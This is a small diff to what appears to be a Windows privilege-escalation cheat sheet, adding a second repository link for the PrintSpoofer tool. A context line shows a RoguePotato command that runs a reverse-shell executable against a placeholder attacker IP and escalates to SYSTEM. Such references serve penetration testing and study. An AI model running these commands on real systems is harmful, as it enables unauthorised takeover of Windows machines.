@@ -613,6 +613,7 @@ C:\PrivEsc\RoguePotato.exe -r [attacker ip] -e "C:\PrivEsc\reverse.exe" -l 9999
 
 ### PrintSpoofer
 > https://github.com/itm4n/PrintSpoofer
+> https://github.com/dievus/printspoofer
 
 The `Print Spooler` service can be used to escalate privileges by executing commands as the SYSTEM user.
 
